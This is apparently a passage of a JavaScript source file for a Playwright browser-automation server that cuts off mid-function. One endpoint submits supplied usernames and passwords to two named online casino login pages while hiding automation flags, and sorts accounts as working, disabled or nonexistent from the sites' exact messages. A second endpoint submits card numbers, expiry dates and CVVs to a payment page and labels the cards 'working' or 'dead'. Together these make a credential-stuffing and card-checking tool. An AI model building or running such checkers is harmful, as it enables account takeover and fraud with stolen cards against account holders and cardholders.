/**
 * @fileoverview Sitchomatic Web — Real Browser Automation Server v1.2
 *
 * Express + Playwright server that performs LIVE browser automation.
 * Serves the webapp static files on port 8791 and provides a REST API
 * on the same port under /api/... for real credential and card checks.
 *
 * Each check opens a real headless Chromium browser, navigates to the
 * target site, fills the form, submits, and captures 4 real screenshots
 * of the actual browser window at each key moment.
 *
 * API endpoints:
 *   POST /api/login-check   — Joe Fortune or Ignition login attempt
 *   POST /api/card-check    — PPSR card check
 *   GET  /api/status        — Server health check
 */

import express from 'express';
import { chromium } from 'playwright';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());

// Serve the webapp static files
app.use(express.static(path.join(__dirname, 'webapp')));

// ── Constants ────────────────────────────────────────────────────────────────

/** Port the server listens on. */
const PORT = 8791;

/**
 * Browser launch options for all automation contexts.
 * Uses Chromium headless with stealth-style args to reduce bot detection.
 */
const BROWSER_ARGS = [
  '--no-sandbox',
  '--disable-setuid-sandbox',
  '--disable-blink-features=AutomationControlled',
  '--disable-infobars',
  '--window-size=1280,800',
];

/** Default page navigation timeout in milliseconds. */
const NAV_TIMEOUT = 30000;

/** How long to wait after submitting a form before taking a screenshot. */
const POST_SUBMIT_WAIT = 3000;

// ── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Captures a viewport screenshot from a Playwright page and returns it as a
 * base64-encoded PNG data URL. Injects a "SCR X/4" badge into the top-right
 * corner of the live page before screenshotting so the label is burned into
 * the real browser image, then removes the badge afterwards.
 *
 * @param {import('playwright').Page} page - The Playwright page to capture.
 * @param {string} [label] - Optional label to burn in, e.g. 'SCR 1/4'.
 * @returns {Promise<string>} Data URL string (data:image/png;base64,...).
 */
async function captureShot(page, label) {
  const BADGE_ID = '_sitcho_scr_badge';
  try {
    if (label) {
      await page.evaluate(([id, text]) => {
        const existing = document.getElementById(id);
        if (existing) existing.remove();
        const el = document.createElement('div');
        el.id = id;
        el.style.cssText = [
          'position:fixed', 'top:12px', 'right:12px',
          'background:rgba(0,0,0,0.72)', 'color:#fff',
          'font-size:13px', 'font-weight:700', 'letter-spacing:0.5px',
          'padding:4px 11px', 'border-radius:6px', 'z-index:2147483647',
          'font-family:ui-monospace,monospace', 'pointer-events:none',
          'box-shadow:0 2px 8px rgba(0,0,0,0.5)',
        ].join(';');
        el.textContent = text;
        document.body.appendChild(el);
      }, [BADGE_ID, label]).catch(() => {});
    }
    const buf = await page.screenshot({ fullPage: false, type: 'png' });
    if (label) {
      await page.evaluate((id) => { document.getElementById(id)?.remove(); }, BADGE_ID).catch(() => {});
    }
    return `data:image/png;base64,${buf.toString('base64')}`;
  } catch {
    return '';
  }
}

/**
 * Attempts to fill a login form on the given page by trying a set of common
 * CSS selectors for email/username and password fields.
 * @param {import('playwright').Page} page - The Playwright page.
 * @param {string} username - Username or email to fill in.
 * @param {string} password - Password to fill in.
 * @returns {Promise<boolean>} True if both fields were found and filled.
 */
async function fillLoginForm(page, username, password) {
  const emailSelectors = [
    'input[type="email"]',
    'input[name="email"]',
    'input[name="username"]',
    'input[name="login"]',
    'input[placeholder*="email" i]',
    'input[placeholder*="username" i]',
    'input[id*="email" i]',
    'input[id*="user" i]',
    'input[id*="login" i]',
    'input[type="text"]:first-of-type',
  ];
  const passSelectors = [
    'input[type="password"]',
    'input[name="password"]',
    'input[name="pass"]',
    'input[placeholder*="password" i]',
    'input[id*="password" i]',
    'input[id*="pass" i]',
  ];

  let emailFilled = false;
  for (const sel of emailSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible({ timeout: 3000 })) {
        await el.click();
        await el.fill('');
        await el.fill(username);
        emailFilled = true;
        break;
      }
    } catch {}
  }

  // Pause after email entry — some sites enable the password field via JS
  // handlers that fire on email input/blur events
  if (emailFilled) await page.waitForTimeout(600);

  let passFilled = false;
  for (const sel of passSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible({ timeout: 3000 })) {
        await el.click();
        await el.fill('');
        await el.fill(password);
        passFilled = true;
        break;
      }
    } catch {}
  }

  // Short settle time after password entry before caller proceeds
  if (passFilled) await page.waitForTimeout(300);

  return emailFilled && passFilled;
}

/**
 * Attempts to dismiss any visible cookie consent / GDPR popup by clicking
 * common accept/dismiss buttons. Runs silently — never throws.
 *
 * Tries text-based button matches first (most reliable across sites), then
 * falls back to common class/id/attribute selectors used by popular consent
 * management platforms (OneTrust, Cookiebot, TrustArc, etc.).
 *
 * Should be called after every page.goto() and after form submissions that
 * may trigger a new page load with a fresh consent overlay.
 *
 * @param {import('playwright').Page} page - The Playwright page.
 * @returns {Promise<void>}
 */
async function dismissCookiePopup(page) {
  const textSelectors = [
    'button:has-text("Accept all")',
    'button:has-text("Accept All")',
    'button:has-text("Accept All Cookies")',
    'button:has-text("Accept all cookies")',
    'button:has-text("Accept & Continue")',
    'button:has-text("Accept")',
    'button:has-text("Accept cookies")',
    'button:has-text("Allow all")',
    'button:has-text("Allow All")',
    'button:has-text("Allow All Cookies")',
    'button:has-text("I Accept")',
    'button:has-text("I agree")',
    'button:has-text("I Agree")',
    'button:has-text("Agree")',
    'button:has-text("Got it")',
    'button:has-text("Got It")',
    'button:has-text("OK")',
    'button:has-text("Ok")',
    'button:has-text("Close")',
    'button:has-text("Dismiss")',
    'button:has-text("Continue")',
  ];
  const attrSelectors = [
    // OneTrust
    '#onetrust-accept-btn-handler',
    '.onetrust-close-btn-handler',
    // Cookiebot
    '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll',
    // TrustArc
    '.trustarc-agree-btn',
    '.truste_popframe .pdynamicbutton',
    // Generic consent platforms
    '[id*="cookie"][id*="accept" i]',
    '[id*="cookie"][id*="allow" i]',
    '[class*="cookie"][class*="accept" i]',
    '[class*="cookie-consent"] button',
    '[class*="cookie-banner"] button',
    '[class*="cookie-notice"] button',
    '[aria-label*="accept" i][role="button"]',
    '[data-testid*="cookie-accept" i]',
    '[data-testid*="consent-accept" i]',
  ];

  for (const sel of [...textSelectors, ...attrSelectors]) {
    try {
      const el = page.locator(sel.endsWith(',') ? sel.slice(0, -1) : sel).first();
      if (await el.count() > 0 && await el.isVisible({ timeout: 400 })) {
        await el.click({ timeout: 1000 });
        return;
      }
    } catch {}
  }
}

/**
 * Clicks the login/submit button on a login form by trying common selectors.
 * @param {import('playwright').Page} page - The Playwright page.
 * @returns {Promise<boolean>} True if a submit button was found and clicked.
 */
async function clickSubmit(page) {
  const submitSelectors = [
    'button[type="submit"]',
    'input[type="submit"]',
    'button:has-text("Log in")',
    'button:has-text("Login")',
    'button:has-text("Sign in")',
    'button:has-text("Sign In")',
    'button:has-text("Submit")',
    '[data-testid*="submit" i]',
    '[data-testid*="login" i]',
    '.login-btn',
    '.btn-login',
    '.submit-btn',
  ];
  for (const sel of submitSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.click();
        return true;
      }
    } catch {}
  }
  return false;
}

/**
 * Analyses the page content after a login attempt to determine the outcome.
 *
 * Strategy (strict — avoids false positives from Cloudflare/anti-bot redirects):
 *  1. Check for hard failure text first (disabled, locked, invalid creds).
 *  2. Only call "working" when MULTIPLE strong success signals are present
 *     (URL path change to account area AND success body text), or when a
 *     high-confidence success keyword appears in the page text.
 *  3. A bare URL redirect is NOT sufficient for "working" — casino sites
 *     redirect to Cloudflare challenges or error pages on every bad login.
 *
 * @param {import('playwright').Page} page - The Playwright page after form submission.
 * @param {string} loginUrl - The original login URL.
 * @returns {Promise<{outcome: string, note: string}>}
 */
async function determineLoginOutcome(page, loginUrl) {
  const url = page.url().toLowerCase();
  const bodyText = (await page.textContent('body').catch(() => '')).toLowerCase();

  // ── Hard failure signals (check first) ──────────────────────────────────
  // Joe Fortune exact: "Your account has been disabled. Please, contact Customer Service."
  // This is the ONLY signal that indicates permanent disable — red textbox below login form.
  if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(bodyText)) {
    return { outcome: 'permDisabled', note: 'Joe Fortune — account permanently disabled (contact Customer Service)' };
  }
  // Joe Fortune exact: "Sorry, your account has been temporarily disabled due to
  // too many failed login attempts. Contact us immediately to re-enable."
  if (/temporarily disabled due to too many failed login attempt/i.test(bodyText)) {
    return { outcome: 'tempDisabled', note: 'Joe Fortune — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.' };
  }
  // Joe Fortune exact — attempt 1 wrong password:
  // "Oops! Your email and/or password are incorrect. Please check that your CAPS lock is not on and try again."
  if (/oops!\s*your email and\/or password are incorrect\.\s*please check that your caps lock/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Joe Fortune — incorrect email/password (attempt 1)' };
  }
  // Joe Fortune exact — attempt 2+ wrong password (warning about blocking):
  // "Your email and/or password remain incorrect. Further failed attempts may result in your account being blocked."
  if (/your email and\/or password remain incorrect\.\s*further failed attempts may result/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Joe Fortune — email/password remain incorrect (account does not exist or wrong credentials)' };
  }
  if (/email.*not.*found|account.*not.*found|user.*not.*found|no account.*found/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'No account found for this email' };
  }
  if (/invalid.*password|incorrect.*password|wrong.*password|password.*incorrect/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Invalid password' };
  }
  if (/invalid.*credential|incorrect.*credential|login.*failed|sign.?in.*failed/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Invalid credentials' };
  }
  if (/your account.*banned|account.*banned|banned.*account/i.test(bodyText)) {
    return { outcome: 'permDisabled', note: 'Account banned' };
  }

  // ── Joe Fortune: specific success signals ───────────────────────────────
  // Signal 1: green "Welcome!" banner with checkmark shown immediately after login
  if (/^\s*welcome\s*!?\s*$/im.test(bodyText) || /✓.*welcome|welcome.*✓/i.test(bodyText)) {
    return { outcome: 'working', note: 'Joe Fortune — Welcome! banner detected (login successful)' };
  }
  // Signal 2: redirected to lobby — nav shows "JOE FORTUNE" + DEPOSIT button + account icon
  // Detected by URL leaving /login and body containing "deposit" without login-page content
  const urlPath = (() => { try { return new URL(page.url()).pathname.toLowerCase(); } catch { return ''; } })();
  const isOffLoginPage = !url.includes('/login')
    && !url.includes('/sign-in')
    && !url.includes('/signin')
    && !url.includes('overlay=login')
    && !url.includes('modal=login')
    && !url.includes('action=login');
  if (isOffLoginPage && /hot pokies|new & exclusive|live casino|specialty games/i.test(bodyText)) {
    return { outcome: 'working', note: 'Joe Fortune — casino lobby detected (login successful)' };
  }
  if (isOffLoginPage && /deposit/i.test(bodyText) && /joe fortune/i.test(bodyText) && /welcome back/i.test(bodyText)) {
    return { outcome: 'working', note: 'Joe Fortune — Welcome Back screen detected (login successful)' };
  }

  // ── General strong success signals ──────────────────────────────────────
  const urlIndicatesSuccess = ['/account', '/dashboard', '/cashier', '/lobby', '/deposit', '/withdraw', '/profile', '/my-account', '/game', '/casino'].some(p => urlPath.startsWith(p));
  const strongSuccessPatterns = [
    /welcome back/i, /account balance/i, /your balance/i, /\$[\d,]+\.\d{2}/,
    /make a deposit/i, /account overview/i,
    /logout/i, /log out/i, /sign out/i, /withdrawal/i,
  ];
  const hasStrongSuccessText = strongSuccessPatterns.some(p => p.test(bodyText));
  const softSuccessPatterns = [/hot pokies/i, /live casino/i, /lobby/i, /balance/i];
  const hasSoftSuccessText = softSuccessPatterns.some(p => p.test(bodyText));

  if (hasStrongSuccessText && isOffLoginPage) {
    return { outcome: 'working', note: 'Login successful — account area detected' };
  }
  if (urlIndicatesSuccess && hasSoftSuccessText) {
    return { outcome: 'working', note: `Login successful — redirected to ${urlPath}` };
  }

  // ── Catch-all failure signals ────────────────────────────────────────────
  if (/cloudflare|captcha|bot.*detected|access denied|403 forbidden|429 too many/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Bot/Cloudflare challenge — unable to verify' };
  }
  if (/error|invalid|incorrect|failed/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Login failed — check screenshots for details' };
  }

  return { outcome: 'noAcc', note: 'Login result unclear — review screenshots' };
}

/**
 * Attempts to fill a card payment form on a page by trying common credit card
 * field selectors. Returns true if the card number field was found and filled.
 * @param {import('playwright').Page} page - The Playwright page.
 * @param {string} number - Card number.
 * @param {string} mm - Expiry month (2 digits).
 * @param {string} yy - Expiry year (2 digits).
 * @param {string} cvv - CVV/CVC code.
 * @returns {Promise<boolean>} True if the card number field was located and filled.
 */
async function fillCardForm(page, number, mm, yy, cvv) {
  const cardNumSelectors = [
    'input[name*="card" i][name*="number" i]',
    'input[id*="card" i][id*="number" i]',
    'input[placeholder*="card number" i]',
    'input[placeholder*="card no" i]',
    'input[data-testid*="card" i]',
    'input[autocomplete="cc-number"]',
    'input[name="cardNumber"]',
    'input[name="card_number"]',
    'input[name="number"]',
  ];
  const expirySelectors = [
    'input[autocomplete="cc-exp"]',
    'input[name*="expiry" i]',
    'input[name*="expiration" i]',
    'input[placeholder*="MM/YY" i]',
    'input[placeholder*="expiry" i]',
  ];
  const cvvSelectors = [
    'input[autocomplete="cc-csc"]',
    'input[name*="cvv" i]',
    'input[name*="cvc" i]',
    'input[name*="csc" i]',
    'input[placeholder*="cvv" i]',
    'input[placeholder*="cvc" i]',
    'input[placeholder*="security code" i]',
  ];

  let cardFilled = false;
  for (const sel of cardNumSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(number);
        cardFilled = true;
        break;
      }
    } catch {}
  }

  // Try combined expiry field (MM/YY)
  for (const sel of expirySelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(`${mm}/${yy}`);
        break;
      }
    } catch {}
  }

  // Try separate month/year fields
  try {
    const mmEl = page.locator('select[name*="month" i], input[name*="month" i]').first();
    if (await mmEl.count() > 0) await mmEl.fill(mm);
    const yyEl = page.locator('select[name*="year" i], input[name*="year" i]').first();
    if (await yyEl.count() > 0) await yyEl.fill(`20${yy}`);
  } catch {}

  for (const sel of cvvSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(cvv);
        break;
      }
    } catch {}
  }

  return cardFilled;
}

/**
 * Analyses page content after a card check to determine the result.
 * @param {import('playwright').Page} page - The Playwright page after submission.
 * @returns {Promise<{outcome: string, note: string}>} Outcome and note.
 */
async function determineCardOutcome(page) {
  const bodyText = (await page.textContent('body').catch(() => '')).toLowerCase();

  if (/declined|do not honor|insufficient funds|card.*not.*accepted|payment.*failed/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Card declined by payment processor' };
  }
  if (/approved|success|payment.*complete|transaction.*approved|authorised/i.test(bodyText)) {
    return { outcome: 'working', note: 'Card approved' };
  }
  if (/invalid.*card|card.*invalid|card.*number.*invalid/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Invalid card number' };
  }
  if (/expired/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Card expired' };
  }
  if (/error/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Error during card check' };
  }

  return { outcome: 'dead', note: 'No clear result — check screenshots' };
}

// ── API: Status ──────────────────────────────────────────────────────────────

/**
 * GET /api/status
 * Returns server health status so the webapp can detect if the automation
 * backend is available before starting a run.
 */
app.get('/api/status', (req, res) => {
  res.json({ ok: true, version: '1.2.0', mode: 'live' });
});

// ── API: Login Check ─────────────────────────────────────────────────────────

/** Maximum number of login attempts before declaring noAcc. */
const MAX_LOGIN_ATTEMPTS = 4;

/** Maximum time to poll for a login response before giving up (ms). */
const RESPONSE_POLL_MS = 15000;

/** Poll interval while waiting for a response (ms). */
const POLL_INTERVAL_MS = 300;

/**
 * Response type codes returned by waitForLoginResponse.
 * @readonly
 * @enum {string}
 */
const RESP = {
  SUCCESS:       'success',
  PERM_DISABLED: 'permDisabled',
  TEMP_DISABLED: 'tempDisabled',
  WRONG_PASS_1:  'wrongPass1',   // "Oops! Your email and/or password are incorrect"
  WRONG_PASS_2:  'wrongPass2',   // "Your email and/or password remain incorrect"
  UNKNOWN:       'unknown',      // timed out with no recognised pattern
};

/**
 * Polls the page body every POLL_INTERVAL_MS for up to maxWaitMs to detect
 * a known login response. Returns a RESP code as soon as one is found, or
 * RESP.UNKNOWN if the timeout expires with no match.
 *
 * Checking this way (rather than a fixed wait) means we react the moment
 * Joe Fortune renders a result rather than always waiting the full delay.
 *
 * @param {import('playwright').Page} page
 * @param {number} [maxWaitMs=5000]
 * @returns {Promise<string>} One of the RESP constants.
 */
async function waitForLoginResponse(page, maxWaitMs = RESPONSE_POLL_MS) {
  const deadline = Date.now() + maxWaitMs;
  while (Date.now() < deadline) {
    const body = (await page.textContent('body').catch(() => '')).toLowerCase();
    const url  = page.url().toLowerCase();

    // ── Disabled (check before success — these appear on the login page) ──
    // Permanently disabled: ONLY the exact Joe Fortune red textbox message
    if (/your account has been disabled\.\s*please,?\s*contact\s+customer\s+service/i.test(body)) return RESP.PERM_DISABLED;
    // Temporarily disabled: too many failed attempts
    if (/temporarily disabled due to too many failed login attempt/i.test(body)) return RESP.TEMP_DISABLED;

    // ── Wrong password signals (also appear on the login page) ────────────
    if (/your email and\/or password remain incorrect.*further failed attempt/i.test(body)) return RESP.WRONG_PASS_2;
    if (/oops.*your email and\/or password are incorrect.*caps lock/i.test(body)) return RESP.WRONG_PASS_1;

    // ── Success: URL must have left the login page ─────────────────────────
    // Ignition uses ?overlay=login (query param) rather than a /login path,
    // so we must check for that pattern too. "WELCOME BACK!" appears on the
    // Ignition login modal title and is NOT a success signal.
    const isOffLoginPage = !url.includes('/login')
      && !url.includes('/sign-in')
      && !url.includes('/signin')
      && !url.includes('overlay=login')
      && !url.includes('modal=login')
      && !url.includes('action=login');
    if (isOffLoginPage) {
      if (/hot pokies|new & exclusive|specialty games/i.test(body)) return RESP.SUCCESS;
      if (/account balance|your balance|make a deposit|my account/i.test(body)) return RESP.SUCCESS;
    }

    await page.waitForTimeout(POLL_INTERVAL_MS);
  }
  return RESP.UNKNOWN;
}

/**
 * POST /api/login-check
 * Performs a real Playwright login attempt against the target casino site.
 *
 * Flow:
 *  1. Navigate to login page, dismiss cookies, fill credentials → SCR 1/4
 *  2. Submit and poll up to 5 s for a known response → SCR 2/4
 *  3. If wrong-password: re-fill and retry up to 4 total attempts → SCR 3/4
 *  4. If still unclear after 4 attempts: navigate to /account as fallback
 *  5. SCR 4/4 — final state
 *
 * Request body:
 *   site       {string} 'joe' | 'ign'
 *   username   {string}
 *   password   {string}
 *   loginUrl   {string}
 *   timeout    {number} optional page timeout ms
 *
 * Response: { outcome, note, shots: [4 base64 PNGs] }
 */
app.post('/api/login-check', async (req, res) => {
  const { site, username, password, loginUrl, timeout = NAV_TIMEOUT } = req.body;
  if (!username || !password || !loginUrl) {
    return res.status(400).json({ error: 'Missing username, password, or loginUrl' });
  }

  let browser;
  const shots = ['', '', '', ''];
  let outcome = 'noAcc';
  let note = 'Check did not complete';

  try {
    browser = await chromium.launch({ headless: true, args: BROWSER_ARGS });
    const context = await browser.newContext({
      viewport: { width: 1280, height: 800 },
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    });
    const page = await context.newPage();
    page.setDefaultTimeout(timeout);

    // ── Step 1: Load login page ───────────────────────────────────────────
    await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout });
    await page.waitForTimeout(2000);
    await dismissCookiePopup(page);

    const filled = await fillLoginForm(page, username, password);
    if (!filled) note = 'Could not locate login form fields on page';

    // SCR 1/4 — 0.7s after the last field click (both fields now filled)
    await page.waitForTimeout(700);
    shots[0] = await captureShot(page, 'SCR 1/4');

    // ── Step 2: First submit → SCR 2/4 (2000ms fixed) → poll outcome ─────
    // Screenshot timing is hardcoded: 2000ms after first submit click so the
    // page has time to render the immediate response before we capture it.
    // After the screenshot we poll to confirm the outcome (fast if already visible).
    let respType = RESP.UNKNOWN;
    const siteName = site === 'ign' ? 'Ignition' : 'Joe Fortune';

    const clicked1 = await clickSubmit(page);
    if (!clicked1) await page.keyboard.press('Enter');

    await page.waitForTimeout(2000); // hardcoded: 2000ms after 1st submit
    await dismissCookiePopup(page);
    shots[1] = await captureShot(page, 'SCR 2/4');

    // Poll for outcome — returns immediately if the response is already visible
    respType = await waitForLoginResponse(page, RESPONSE_POLL_MS);

    // Evaluate result after first attempt
    if (respType === RESP.SUCCESS) {
      outcome = 'working';
      note = `${siteName} — login successful`;
    } else if (respType === RESP.PERM_DISABLED) {
      outcome = 'permDisabled';
      note = `${siteName} — account permanently disabled (contact Customer Service)`;
    } else if (respType === RESP.TEMP_DISABLED) {
      outcome = 'tempDisabled';
      note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
    }

    // ── Step 3: Retry submit → SCR 3/4 (2500ms fixed) → poll outcome ─────
    // Screenshot taken 2500ms after the second submit click.
    if (respType === RESP.WRONG_PASS_1 || respType === RESP.WRONG_PASS_2 || respType === RESP.UNKNOWN) {
      await fillLoginForm(page, username, password);
      const clicked2 = await clickSubmit(page);
      if (!clicked2) await page.keyboard.press('Enter');

      await page.waitForTimeout(2500); // hardcoded: 2500ms after 2nd submit
      await dismissCookiePopup(page);
      shots[2] = await captureShot(page, 'SCR 3/4');

      respType = await waitForLoginResponse(page, RESPONSE_POLL_MS);

      if (respType === RESP.SUCCESS) {
        outcome = 'working';
        note = `${siteName} — login successful (attempt 2)`;
      } else if (respType === RESP.PERM_DISABLED) {
        outcome = 'permDisabled';
        note = `${siteName} — account permanently disabled (contact Customer Service)`;
      } else if (respType === RESP.TEMP_DISABLED) {
        outcome = 'tempDisabled';
        note = `${siteName} — temporarily disabled (too many failed attempts). Retry eligible after ~1 hour.`;
      } else if (respType === RESP.WRONG_PASS_2) {
        outcome = 'noAcc';
        note = `${siteName} — incorrect credentials on retry (account does not exist or wrong password)`;
      }
    } else {
      // Outcome already determined after attempt 1 — capture current state for SCR 3/4
      shots[2] = await captureShot(page, 'SCR 3/4');
    }

    // ── Step 4: Fallback account-page check → SCR 4/4 (2000ms fixed) ─────
    // Navigates to the account page. If it loads without redirecting back to
    // /login the session is active (logged in). Screenshot taken 2000ms after
    // navigation to allow JS-rendered content to paint.
    const needsFallback = outcome !== 'working' && outcome !== 'permDisabled' && outcome !== 'tempDisabled';
    try {
      const accountUrl = site === 'ign'
        ? loginUrl.replace(/\/login.*$/, '/account')
        : 'https://joefortunepokies.win/account';
      await page.goto(accountUrl, { waitUntil: 'load', timeout: 20000 });
      await page.waitForTimeout(2000); // hardcoded: 2000ms after account-page navigation
      await dismissCookiePopup(page);

      if (needsFallback) {
        const finalUrl = page.url().toLowerCase();
        if (!finalUrl.includes('/login') && !finalUrl.includes('/sign-in') && !finalUrl.includes('/signin')) {
          outcome = 'working';
          note = `${siteName} — account page loaded without redirect (fallback — logged in)`;
        } else {
          outcome = 'noAcc';
          note = `${siteName} — redirected back to login (not logged in)`;
        }
      }
    } catch (fallbackErr) {
      if (needsFallback) {
        outcome = 'noAcc';
        note = `Fallback check failed: ${fallbackErr.message}`;
      }
      // Still take SCR 4/4 of whatever state the page is in
    }

    shots[3] = await captureShot(page, 'SCR 4/4');

  } catch (err) {
    note = `Automation error: ${err.message}`;
    outcome = 'noAcc';
  } finally {
    if (browser) await browser.close().catch(() => {});
  }

  res.json({ outcome, note, shots });
});

// ── API: Card Check ───────────────────────────────────────────────────────────

/**
 * POST /api/card-check
 * Performs a real Playwright card check against the configured PPSR/payment URL.
 * Takes 4 real browser screenshots at key moments.
 *
 * Request body:
 *   number     {string} card number digits
 *   mm         {string} expiry month (2-digit)
 *   yy         {string} expiry year (2-digit)
 *   cvv        {string} CVV/CVC code
 *   ppsrUrl    {string} URL of the card check page
 *   timeout    {number} optional page timeout ms (default 30000)
 *
 * Response:
 *   outcome    {string} 'working' | 'dead'
 *   note       {string} human-readable result description
 *   shots      {string[]} array of 4 base64 PNG data URLs
 *     [0] page loaded, form visible
 *     [1] form filled with card details
 *     [2] first response after submit
 *     [3] final result state
 */
app.post('/api/card-check', async (req, res) => {
  const { number, mm, yy, cvv, ppsrUrl, timeout = NAV_TIMEOUT } = req.body;
  if (!number || !mm || !yy || !cvv || !ppsrUrl) {
    return res.status(400).json({ error: 'Missing card fields or ppsrUrl' });
  }

  let browser;
  const shots = ['', '', '', ''];
  let outcome = 'dead';
  let note = 'Check did not complete';

  try {
    browser = await chromium.launch({ headless: true, args: BROWSER_ARGS });
    const context = await browser.newContext({
      viewport: { width: 1280, height: 800 },
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    });
    const page = await context.newPage();
    page.setDefaultTimeout(timeout);

    // Navigate to check page
    await page.goto(ppsrUrl, { waitUntil: 'domcontentloaded', timeout });
    await page.waitForTimeout(2000);
    await dismissCookiePopup(page);

    // Shot 1: page loaded, form visible
    shots[0] = await captureShot(page, 'SCR 1/4');

    // Fill card form
    const filled = await fillCardForm(page, number, mm, yy, cvv);
    if (!filled) {
      note = 'Could not find card number field on page';
    }

    // Shot 2: form filled with card details
    shots[1] = await captureShot(page, 'SCR 2/4');

    // Submit
    const clicked = await clickSubmit(page);
    if (!clicked) {
      await page.keyboard.press('Enter');
    }

    // Wait for response
    await page.waitForTimeout(2000);
    try {
      await page.waitForLoadState('networkidle', { timeout: POST_SUBMIT_WAIT });
    } catch {}
    await page.waitForTimeout(1000);
    await dismissCookiePopup(page);

    // Shot 3: first response after submit
    shots[2] = await captureShot(page, 'SCR 3/4');

    // Determine outcome
    const result = await determineCardOutcome(page);
    outcome = result.outcome;
    note = result.note;

    // Shot 4: final state
    shots[3] = await captureShot(page, 'SCR 4/4');

  } catch (err) {
    note = `Automation error: ${err.message}`;
    outcome = 'dead';
  } finally {
    if (browser) await browser.close().catch(() => {});
  }

  res.json({ outcome, note, shots });
});

// ── API: Flow Recorder ────────────────────────────────────────────────────────

/**
 * In-memory state for the active flow recording session.
 * Only one session may be active at a time.
 * @type {{ step: number, labels: string[], selectors: string[], status: string, error: string } | null}
 */
let flowSession = null;

/**
 * Waits for the user's next interaction inside the recording browser.
 * Returns { selector, ts } when the user clicks a page element, or
 * { done: true } when the user presses the "✓ Done" button in the overlay bar.
 *
 * Selector priority: id → input type → name → placeholder → data-testid →
 *   aria-label → button text → first class → tag name.
 *
 * @param {import('playwright').Page} page
 * @returns {Promise<{selector: string, ts: number}|{done: true}>}
 */
async function waitForRecordedEvent(page) {
  return page.evaluate(() => new Promise(resolve => {
    function sel(el) {
      if (!el || el.tagName === 'BODY') return 'body';
      const tag = el.tagName.toLowerCase();
      if (el.id && /^[a-zA-Z_]/.test(el.id)) return '#' + el.id;
      const type = el.getAttribute('type');
      if (type === 'email')    return 'input[type="email"]';
      if (type === 'password') return 'input[type="password"]';
      if (type === 'submit')   return tag + '[type="submit"]';
      const name = el.getAttribute('name');
      if (name) return tag + '[name="' + name + '"]';
      const ph = el.getAttribute('placeholder');
      if (ph) return tag + '[placeholder="' + ph.replace(/"/g, '\\"') + '"]';
      const tid = el.getAttribute('data-testid');
      if (tid) return '[data-testid="' + tid + '"]';
      const al = el.getAttribute('aria-label');
      if (al) return '[aria-label="' + al.replace(/"/g, '\\"') + '"]';
      if (tag === 'button') {
        const txt = (el.textContent || '').trim().slice(0, 40);
        if (txt) return 'button:has-text("' + txt.replace(/"/g, '\\"') + '")';
      }
      if (el.className && typeof el.className === 'string') {
        const c = el.className.trim().split(/\s+/)[0];
        if (c) return tag + '.' + c;
      }
      return tag;
    }
    function handler(e) {
      // "Done" button inside the overlay bar → signal end of recording
      const doneBtn = document.getElementById('_sitcho_done_btn');
      if (doneBtn && (e.target === doneBtn || doneBtn.contains(e.target))) {
        e.preventDefault();
        e.stopPropagation();
        document.removeEventListener('click', handler, true);
        resolve({ done: true });
        return;
      }
      // Other clicks inside the overlay bar are ignored (don't record them)
      const bar = document.getElementById('_sitcho_rec_bar');
      if (bar && bar.contains(e.target)) return;

      e.preventDefault();
      e.stopPropagation();
      document.removeEventListener('click', handler, true);
      resolve({ selector: sel(e.target), ts: Date.now() });
    }
    document.addEventListener('click', handler, true);
  }));
}

/**
 * Injects or updates the recording overlay bar inside the headed browser.
 * Shows how many clicks have been captured so far and a "✓ Done" button.
 * @param {import('playwright').Page} page
 * @param {number} count - Number of clicks captured so far.
 */
async function updateRecordingOverlay(page, count) {
  await page.evaluate((count) => {
    let bar = document.getElementById('_sitcho_rec_bar');
    if (!bar) {
      bar = document.createElement('div');
      bar.id = '_sitcho_rec_bar';
      bar.style.cssText = [
        'position:fixed', 'top:0', 'left:0', 'right:0', 'z-index:2147483647',
        'background:rgba(0,0,0,0.88)', 'color:#fff',
        'padding:8px 16px', 'font:14px/1.4 system-ui,sans-serif',
        'display:flex', 'align-items:center', 'gap:12px',
        'border-bottom:2px solid #30d5c8',
      ].join(';');
      document.body.prepend(bar);
    }
    const badge = count === 0
      ? '<span style="background:#30d5c8;color:#000;padding:2px 8px;border-radius:4px;font-weight:700;white-space:nowrap">READY</span>'
      : '<span style="background:#30d5c8;color:#000;padding:2px 8px;border-radius:4px;font-weight:700;white-space:nowrap">CLICK ' + count + '</span>';
    bar.innerHTML =
      badge +
      '<span style="flex:1">Click elements in order (cookie dismiss → email → password → submit + any extras). Press <strong>✓ Done</strong> when finished.</span>' +
      '<button id="_sitcho_done_btn" style="background:#34c759;color:#000;border:none;padding:5px 14px;border-radius:4px;font-weight:700;cursor:pointer;font-size:13px;white-space:nowrap">✓ Done</button>';
